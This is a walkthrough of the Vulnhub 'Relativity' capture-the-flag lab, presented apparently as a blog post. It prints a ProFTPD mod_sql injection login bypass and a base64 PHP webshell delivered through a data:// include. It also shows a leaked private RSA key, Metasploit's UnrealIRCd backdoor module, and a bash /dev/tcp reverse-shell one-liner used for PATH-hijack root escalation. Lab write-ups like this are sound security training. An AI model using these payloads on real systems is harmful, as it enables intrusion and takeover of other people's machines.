## Vulnhub Relativity Writeup

Another machine by Sagi, it's Relativity on Vulnhub.
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.2.8 - 1.2.9
22/tcp open  ssh     OpenSSH 5.9 (protocol 2.0)
| ssh-hostkey: 
|   1024 42:d0:50:45:6c:4f:6a:25:d9:5e:d4:7d:12:26:04:ef (DSA)
|_  2048 1b:e9:72:2b:8a:0b:57:0a:4b:ad:3d:06:62:94:29:02 (RSA)
80/tcp open  http    Apache httpd 2.2.23 ((Fedora))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.23 (Fedora)
|_http-title: M.C. Escher - Relativity
MAC Address: 00:0C:29:23:10:67 (VMware)
Service Info: Host: Relativity; OS: Unix
```
Looking at the webserver gives us this cool M.C. Escher picture. Nothing else in the source here, so we bruteforce for some files sitting around while checking out ftp.

![](pics/webserver.JPG)

We cant login as anonymous, but we see several things on exploitdb that might be relevant for this version of ProFTPD. We can see its also running mod_sql as some kind of plugin. 

```bash
$ ftp 192.168.147.178
Connected to 192.168.147.178.
220 Welcome to Relativity FTP (mod_sql)
Name (192.168.147.178:root): anonymous
331 Password required for anonymous.
Password:
530 Login incorrect.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

After looking again at the searchsploit results we see a mod_sql exploit and check it out. Looks straightforward enough we can bypass authentication with a union injection on the username and login as whoever with no password.

```bash
$ searchsploit -m exploits/multiple/remote/32798.pl
  Exploit: ProFTPd 1.3 - 'mod_sql' 'Username' SQL Injection
      URL: https://www.exploit-db.com/exploits/32798
     Path: /usr/share/exploitdb/exploits/multiple/remote/32798.pl
File Type: ASCII text, with CRLF line terminators

Copied to: /root/labs/vulnhub/relativity/32798.pl
```
```bash
$user = "USER %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --";
$pass = '1';
```
That above payload from the exploit doesn't seem to work, we mess around and change the comment dashes -- to a # and it does work we're logged in. This might have something to do with MySQL expecting a space after the comment symbols, which also doesn't work if we try that as ProFTP most likely truncates it? So instead the # symbol is one way to avoid that issue.

```bash
$ ftp 192.168.147.178
Connected to 192.168.147.178.
220 Welcome to Relativity FTP (mod_sql)
Name (192.168.147.178:root): root %') and 1=2 union select 1,1,uid,gid,homedir,shell from users;#
331 Password required for root.
Password:
230 User root %') and 1=2 union select 1,1,uid,gid,homedir,shell from users;# logged in.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 root     root         4096 Mar  5  2013 0f756638e0737f4a0de1c53bf8937a08
-rw-r--r--   1 root     root       235423 Mar  5  2013 artwork.jpg
-rw-r--r--   1 root     root          130 Mar  5  2013 index.html
226 Transfer complete.
ftp> 
```
Looks like its the webroot in there with that nice picture, what is that long ass hash? We visit it in the browser and get to some kind of menu based application with an interesting bio and some more pics of M.C. Escher.

![](pics/2ndblog.JPG)

We try to include some other files on the page= parameter with different methods and encodings but don't get anywhere yet. Next we try using a PHP wrapper like ```data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7IA==``` on it which seems to always work and we can execute one command at a time with this shell in burp or with curl like so. 
```bash
$ curl -v '192.168.147.178/0f756638e0737f4a0de1c53bf8937a08/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7IA==&cmd=id'
```
We can see the index.php is doing a bit of filtering when it includes things.
```php
<div id="content">';
$blacklist_include=array("php://");
for ($i=0; $i<count($blacklist_include); $i++){
       	if (strpos($_GET['page'],$blacklist_include[$i]) !== false){
                die();
        }
}
$page = $_GET['page'];
include ($page);
echo	'</div>
```
We try doing the usual one liner reverse shells but the blacklisting or something else is preventing it. From here we can cat /etc/passwd and see two users with login shells, mauk and jetta. When we look at mauk's home directories we notice his private key is readable and not encrypted.
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA5sm/rHHoCaTtncp7DCSIJlWnUg9eyfpJ3czIn18U1lv5ZQf0
9yGaDxafualdpXCNMo32mVQb9XQ7c2N7sdSdAjsgSjV0YG/IZGZNRyFS58YJQRdZ
5wRu6eKAlQVss/Lq3zwuBsT8Om/1/cKpVgB3ukPtKA97M5iSxL1VWWXg6GVoJ6f6
zIio/DZMFCxOU9Wyl7i8ssEoBxQlmgZh9pnYYhwo7Rf3RXBJeHDpuc1g+vol2vRN
ALXqIBlItS08MhoTaS0SK+pD98OU34M745U5Mo4TgFjYc+eD7xewyduWuS5IuFPd
xfcHkt0cQ7he0AYHuk5ooCI4ca3B0xcSZILWqwIDAQABAoIBAHNnIMxXLQNdkGAd
tsfMoLQikodrHif7WuJpG0zuG5pQ5XWKtAi7qbCvzHDnaudmT4SfDld/gneLhord
jSXQPi62aCATeL0cSGVD7pKJ7E3vbgM5bQAi7F9RnqBl1QRqjN3R1uYVrFaAU85v
f4N8umHOw5ELpLyZJ5LvZfVNB1jNIRpxINhAP+/kVslsZ93qyssljokKFMy/uOIH
r+SV3b3Zfogvg67AJ/g08jtCjYdbr7egPP2TYPMRz5fbTWCrc5m4EBvf5h5pP/w6
Go12YacY2lbF5wzbFUjIdNyF7RZHFDbSB0bM9aCDmXTfywlFswYdb7HyIZrstQ9W
BzWhIYkCgYEA/tUe/rhUcEYEXkhddkXWARcX0t9YNb8apY7WyVibiSyzh33mscRG
MLZoJJri5QMvNdYkNGr5zSGEo270Q2CzduKCbhVjXIybIbmggAc/80gZ5E8FDgJ7
szUKJL37BxXbAAYFIZkzXvc76Ve+vZvLfKMTbQqXTgKkQpGyRHLVOz8CgYEA59ht
YicNlz2yM26mpGqQNLGtEC1RmyZbPn03yJRTBJG5/sOlMw0RI+cMEiqyo7MKHmMZ
+Z7VKVtk8xEQbUy6EAeeSri/Fh1xiKRtlwwQSU1q2ooPOmdHyUp+rhseoPaDAJgy
3KJYbkQMzHVt6KhsWVTEnrz0VtxiTzRu7p2Y5ZUCgYEAt5X2RG+rdU8b6oibvI9H
Q3XNlf+NXvsUSV2EY33QX5yyodQUFNFf98wRbv2epHoM0u45GwJOgHe7RLq0gq3x
3J4GdSQ3dv9c64j9lf6jFbNF4/MBozwqvcpiSmILrOkT4wpzO+dQ2QOoR80M/zB0
ApDBd/b/VhYVHFg2Y5WPBKUCgYBn47SIMgXGCtBqeZ/UtyetZRyuzg/uXQ6v/r5b
dBOLTZ2xyouhR66xjtv63AU2k4jqOvAtyf2szZZ70N6yi5ooirFkvEpsJ39zgnLV
J4O4xScnjIvsWNFzIp2HeQGNkUj8oDbSZTEJIBc4GzrH8Yizsud0VimLLrAi29UF
ubsEzQKBgQDpWaD5rTcaWueiH2DwI7kbdgyf6yfpunsRNsnq0GqZ2wSaUyKt9b1j
bj9Dp+VxrUt584v//7z9Skkde2akJbA/qiF8/oOvzaiNRAOfpLCiqoL0vJ5dIvcg
aXwuOk5Dt0/xQWPAKHL6HYyzQjnad/VAmn6tnxko1A/S8ELiG+MUtg==
-----END RSA PRIVATE KEY-----
```
Nice deal now we can get a real shell as mauk on the box without his password.
```bash
$ ssh -i mauk.key mauk@192.168.147.178
[mauk@Relativity ~]$ id && uname -a
uid=1001(mauk) gid=1001(mauk) groups=1001(mauk)
Linux Relativity 3.9.8-100.fc17.x86_64 #1 SMP Thu Jun 27 19:19:57 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
```
So we have 64 bit Fedora 17 here. Looking at mauk's .bash_history file we can see him doing something else with some ssh commands. The ssh -R is forwarding localport 6667 back to the same port on his machine I'm assuming, then the -f flag is to run it in the background and -N is to not execute any remote commands. 
```bash
[mauk@Relativity ~]$ cat .bash_history 

ssh -f root@192.168.144.228 -R 6667:127.0.0.1:6667 -N
su -
exit
su -
[mauk@Relativity ~]$ netstat -antp
(No info could be read for "-p": geteuid()=1001 but you should be root.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6667          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp        0     40 192.168.147.178:22      192.168.147.171:34850   ESTABLISHED -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                  
```
We also notice Unreal ircd running as the other user jetta in the ps list and eventually remember that 6667 is the irc port. Lets forward that port back to our attacker box. We do ```ssh -L 6667:127.0.0.1:6667 mauk@192.168.147.178 -i mauk.key``` from our machine then in another window we can connect to it locally at 127.0.0.1:6667 with irssi or whatever.

```bash
 Irssi v1.2.1-1 - https://irssi.org                                                                                                                                                                                
23:06 -!- Irssi: Looking up 127.0.0.1
23:06 -!- Irssi: Connecting to 127.0.0.1 [127.0.0.1] port 6667
23:06 -!- Irssi: Connection to 127.0.0.1 established
23:06 !relativity.localdomain *** Looking up your hostname...
23:07 !relativity.localdomain *** Couldn't resolve your hostname; using your IP address instead
23:07 -!- You have not registered
23:07 -!- Welcome to the Relativity IRC Network root!root@localhost
23:07 -!- Your host is relativity.localdomain, running version Unreal3.2.8.1
23:07 -!- This server was created Thu Feb 28 2013 at 17:54:35 EST
23:07 -!- relativity.localdomain Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
23:07 -!- UHNAMES NAMESX SAFELIST HCN MAXCHANNELS=10 CHANLIMIT=#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 are supported by this server
23:07 -!- WALLCHOPS WATCH=128 WATCHOPTS=A SILENCE=15 MODES=12 CHANTYPES=# PREFIX=(qaohv)~&@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=Relativity CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT 
          STATUSMSG=~&@%+ are supported by this server
23:07 -!- EXCEPTS INVEX CMDS=KNOCK,MAP,DCCALLOW,USERIP are supported by this server
23:07 -!- There are 1 users and 0 invisible on 1 servers
23:07 -!- I have 1 clients and 0 servers
23:07 -!- Current Local Users: 1  Max: 1
23:07 -!- Current Global Users: 1  Max: 1
23:07 -!- - relativity.localdomain Message of the Day - 
23:07 -!- - 9/7/2013 9:17
23:07 -!- -     __________       .__          __  .__      .__  __
23:07 -!- -     \______   \ ____ |  | _____ _/  |_|__|__  _|__|/  |_ ___.__.
23:07 -!- -      |       _// __ \|  | \__  \\   __\  \  \/ /  \   __<   |  |
23:07 -!- -      |    |   \  ___/|  |__/ __ \|  | |  |\   /|  ||  |  \___  |
23:07 -!- -      |____|_  /\___  >____(____  /__| |__| \_/ |__||__|  / ____| ·VM·
23:07 -!- -             \/     \/          \/                        \/
23:07 -!- End of /MOTD command.
23:07 -!- Mode change [+iwx] for user root
```
No chats are happening in here, but noticing the version 3.2.8.1 of UnrealIRCD, we remember an older command execution exploit against this that even has a metasploit module. Using msf with a cmd/unix/reverse_perl payload, we can get a shell back this time as jetta.
```bash
msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > run

[*] Started reverse TCP handler on 192.168.147.171:4444
[*] 127.0.0.1:6667 - Connected to 127.0.0.1:6667...
    :relativity.localdomain NOTICE AUTH :*** Looking up your hostname...
[*] 127.0.0.1:6667 - Sending backdoor command...
[*] Command shell session 1 opened (192.168.147.171:4444 -> 192.168.147.178:42049) at 2019-09-04 23:21:26 -0400

id
uid=1002(jetta) gid=1002(jetta) groups=1002(jetta)
```
We can now checkout jettas home folder, looks like some kind of binary in there "auth_server". 
```bash
ls -lah /home/jetta/auth_server/           
total 16K
drwxr-xr-x  2 root  root  4.0K Jul  9  2013 .
drwx------. 3 jetta jetta 4.0K Jul  9  2013 ..
-rwxr-xr-x  1 root  root  7.9K Mar  8  2013 auth_server
file /home/jetta/auth_server/auth_server
/home/jetta/auth_server/auth_server: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=0x93cf19e57baa43cf0162c34308bc11b8f361c00d, not stripped
strings /home/jetta/auth_server/auth_server
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
fflush
puts
putchar
printf
poll
stdout
system
__libc_start_main
GLIBC_2.2.5
l$ L
t$(L
|$0H
[+] Checking Certificates... 
done
[+] Contacting server, please wait... 
could not establish connection
invalid certificates
error: (12)
fortune -s | /usr/bin/cowsay
Starting Auth server..
;*3$"
```

What is /usr/bin/cowsay doing? It's just a perl script loading "cowfiles". We try and run the auth_server executable and see if it does anything, it seems to fail to connect to whatever it's looking for. After glancing at fortune and cowsay again, it looks like some kind of game or trivia bot. Alas we cant write to any of these files at the moment. 
```bash
/home/jetta/auth_server/auth_server                                         
[+] Checking Certificates...done                                       
[+] Contacting server, please wait...- _____________________________________ 
/ This is a test of the emergency     \                                  
| broadcast system. Had there been an |                               
| actual emergency, then you would no |                                   
\ longer be here.                     /                             
 -------------------------------------                                    
        \   ^__^                                                        
         \  (oo)\_______                                               
            (__)\       )\/\                                                                                   
                ||----w |                                                 
                ||     ||                                                                            
could not establish connection                                                                          error: (12)                                               
```
After thinking about that for a minute and looking around a bit elsewhere, we remember to check what sudo commands jetta might have here.
```bash
python -c "import pty;pty.spawn('/bin/sh');"
sh-4.2$ sudo -l
sudo -l
Matching Defaults entries for jetta on this host:
    requiretty, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
    LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY PATH", env_reset

User jetta may run the following commands on this host:
    (root) NOPASSWD: /home/jetta/auth_server/auth_server
```
Ahh so we can run auth_server as root then, notice above in the strings output how its calling fortune -s with no path? Well lets do the same old same old add a new folder to our path and create a file named fortune that does something as root, update our PATH, then we run auth server again and it's game over. We can just make our fortune a ```bash -i >& /dev/tcp/192.168.147.171/443 0>&1``` one liner and hopefully get a shell back. 
```bash
sh-4.2$ echo 'bash -i >& /dev/tcp/192.168.147.171/443 0>&1' > fortune && chmod +x fortune
sh-4.2$ export PATH=/home/jetta:${PATH}
sh-4.2$ sudo auth_server/auth_server
sudo auth_server/auth_server
[+] Checking Certificates...done
[+] Contacting server, please wait...could not establish connection
error: (12)

```
It hangs this time and sends us a shell as root, we cat the flag and its all over.
```bash
root@splinter:~/labs/vulnhub/relativity# nc -nlvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 192.168.147.178.
Ncat: Connection from 192.168.147.178:58048.
[root@Relativity jetta]# id
id
uid=0(root) gid=0(root) groups=0(root)
[root@Relativity jetta]# cat /root/flag.txt
cat /root/flag.txt
65afa0e5928b98f7ae283e16df2d43bf
```

Thanks for that @Sagi, a nice relaxing box with a couple interesting SQL injection and RFI vulnerabilities then the reverse port forward and the IRC exploit was pretty cool. I've had some fun with your Vulnhub machines and priv esc workshop stuff on github, thanks for making all that. Thanks also to Vulnhub for hosting everything for free and being awesome.










